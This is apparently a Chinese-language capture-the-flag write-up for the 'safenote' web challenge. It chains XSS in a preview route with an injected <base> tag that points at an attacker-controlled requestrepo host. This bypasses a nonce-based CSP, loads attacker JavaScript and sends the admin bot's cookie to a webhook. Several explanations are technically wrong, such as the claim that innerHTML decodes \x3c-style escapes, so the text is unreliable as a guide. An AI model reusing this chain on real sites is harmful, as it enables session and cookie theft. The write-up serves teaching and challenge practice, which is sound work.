WEB || safenote

safenotes.zip

1. 应用架构与漏洞点详解

  • 这是一个笔记应用，允许用户添加、预览笔记

  • 应用运行在 localhost:3000

  • 有一个 admin bot 会访问用户提交的 URL

  • flag 存储在 cookie 中，仅对 localhost 域名有效

  • 应用实现了严格的 CSP 策略

关键漏洞点：

  1. Preview 路由中的 XSS：

    • /preview 路由使用 innerHTML 渲染内容

    • 应用使用了 escapeHTML() 函数进行过滤，但这可以通过 Unicode 编码绕过

    • 这是整个攻击链的入口点

  2. CSP 配置缺陷：

    • script-src 'nonce-${nonce}' 限制了脚本执行,表示只有带有特定随机 nonce 值的脚本才能执行

    • default-src 'none' 阻止了外部资源加载

    • 这种 CSP 配置通常能有效防止 XSS 攻击，因为攻击者无法预知 nonce 值，也无法直接执行内联脚本。

      • 但缺少了 base-uri 的限制，这是关键漏洞，因为 <base> 标签可以改变页面中所有相对 URL 的基础路径。

      • 同时也缺少了 navigate-to 的限制，允许页面跳转

2. 第一步：注入 <base> 标签

Payload 详解：

  • \x3c 是 < 的 Unicode 编码

  • \x22 是 " 的 Unicode 编码

  • 完整解码后是：<base href="//ps7mhqop.requestrepo.com">，其中 VPS 是攻击者控制的服务器域名

为什么使用 Unicode 编码？

这是为了绕过应用可能实现的过滤机制。许多 XSS 防御机制会过滤或转义 < 和 > 字符，但可能没有处理它们的 Unicode 编码形式。当这个编码的内容被 innerHTML 解析时，浏览器会将其识别为实际的 HTML 标签。

为什么使用 // 协议相对 URL？

使用 //VPS 而不是 http://VPS 或 https://VPS 的原因是：

  • 协议相对 URL 会继承当前页面的协议（http 或 https）

  • 这增加了攻击的灵活性，无论目标应用使用什么协议都能工作

  • 如果目标使用 HTTPS，而我们硬编码 HTTP，可能会因为混合内容而被阻止

<base> 标签的作用：

<base> 标签会改变页面中所有相对 URL 的解析基础。例如：

  • 原本 /js/app.js 指向 http://localhost:3000/js/app.js

  • 设置 <base href="//VPS"> 后，同样的路径会指向 http(s)://VPS/js/app.js

这意味着页面中所有使用相对路径的资源加载（如脚本、样式表、图片等）都会从攻击者的服务器加载，而不是原始服务器。

3. 第二步：添加第二个笔记

为什么需要添加第二个笔记？

  • 必须有“后续的相对脚本加载”在 <base> 生效之后发生，它才会被劫持到你的 VPS。

  • 解析到“笔记0”的 <script src=”/preview?…”> → 先按原始基准加载并执行 → 这一步把 <base> 注入到 DOM。

  • 解析继续往下走，遇到“笔记1”的 <script src=”/preview?…”> → 此时“已有 <base> 生效”，这个相对地址就会被重写到你的 VPS → 加载并执行你返回的 JS（脚本标签自带 nonce，满足 CSP）。

4. 第三步：在攻击者服务器上准备恶意 JavaScript

JavaScript 文件放置位置：

这个文件必须放在与目标应用加载的 JavaScript 文件相同的路径上。例如，如果应用加载：

  • /js/main.js

  • /assets/scripts/app.js

  • /bundle.js

那么攻击者需要在自己的服务器上创建相同的目录结构和文件名，并在这些文件中放置恶意代码。

为什么使用 location.href 而不是 fetch 或 XMLHttpRequest？

这是因为 CSP 设置了 default-src 'none'，它会阻止通过 fetch 或 XMLHttpRequest 发送请求。但 CSP 没有限制 navigate-to（页面导航），所以可以使用 location.href 进行页面跳转，并在 URL 中携带数据。

5. 第四步：触发 admin bot 访问

为什么提交 localhost:3000 而不是其他 URL？

这是整个攻击的关键点：

  • flag cookie 被设置为仅在 localhost 域上有效

  • 如果让 bot 访问攻击者的服务器，bot 不会带上 flag cookie

  • 但让 bot 访问 localhost:3000，它会带上包含 flag 的 cookie

6. 完整攻击流程的时序详解

  1. 分析目标应用：

    • 发现 /preview 路由存在 XSS 漏洞

    • 分析 CSP 策略，发现缺少 base-uri 和 navigate-to 的限制

    • 确定应用加载的 JavaScript 文件路径

  2. 注入 <base> 标签：

    • 创建包含编码后的 <base> 标签的笔记内容

    • 将笔记添加到应用中

    • 访问 /preview 路由查看笔记，触发 XSS，<base> 标签被解析并生效

  3. 添加第二个笔记：

    • 由于 <base> 标签的影响，无法通过浏览器正常添加笔记

    • 直接发送 POST 请求到原始应用添加第二个笔记

  4. 触发 admin bot 访问：

    • 向 /report 接口提交 http://localhost:3000/ URL

    • admin bot 访问提交的 URL

    • bot 加载页面，包括注入的 <base> 标签

  5. 劫持资源加载：

    • 由于 <base> 标签的影响，bot 从攻击者服务器加载 JavaScript 文件

    • bot 执行恶意 JavaScript 代码

  1. 数据窃取：

    • 恶意代码通过 location.href 重定向 bot 到攻击者的 webhook

    • 重定向 URL 中包含 bot 的 cookie，其中包含 flag

    • webhook 服务接收请求，攻击者获取 flag

7. Payload 构造的技术细节

Unicode 编码绕过

\x3cbase href=\x22//VPS\x22\x3e 使用 Unicode 编码绕过过滤的具体原理：

  1. 浏览器处理 Unicode 编码的流程：

    • 当内容被设置到 innerHTML 时，浏览器会解码 Unicode 字符

    • 解码后的内容被解析为 HTML

    • 生成的 DOM 元素会影响页面行为

  2. 常见的过滤绕过技术：

    • \x3c 代替 <

    • \x3e 代替 >

    • \x22 代替 "

    • \x27 代替 '

    • \x2f 代替 /

  1. 更复杂的情况可能需要使用：

    • HTML 实体编码：&lt; 代替 <

    • 十进制 Unicode：&#60; 代替 <

    • 十六进制 Unicode：&#x3c; 代替 <
